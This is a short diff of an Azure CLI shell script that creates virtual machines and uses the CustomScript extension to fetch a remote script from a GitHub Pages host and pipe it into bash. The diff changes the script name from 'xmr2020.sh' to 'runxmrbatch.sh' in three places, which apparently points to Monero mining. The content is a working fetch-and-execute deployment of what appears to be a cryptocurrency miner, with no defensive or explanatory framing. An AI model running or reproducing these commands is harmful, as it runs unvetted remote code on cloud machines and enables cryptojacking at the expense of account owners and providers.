@@ -14,7 +14,7 @@ az vm extension set \
   --name CustomScript \
   --vm-name myVM3 \
   --resource-group myResourceGroup3 \
-  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'
+  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/runxmrbatch.sh\" | bash"}'
 
 az group create --name myResourceGroup4 --location eastus
 
@@ -32,7 +32,7 @@ az vm extension set \
   --name CustomScript \
   --vm-name myVM11 \
   --resource-group myResourceGroup4 \
-   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'
+   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/runxmrbatch.sh\" | bash"}'
   
 az group create --name myResourceGroup2552 --location westus2
 
@@ -51,5 +51,5 @@ az vm extension set \
   --name CustomScript \
   --vm-name myVM22 \
   --resource-group myResourceGroup2552 \
-   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'
+   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/runxmrbatch.sh\" | bash"}'
 
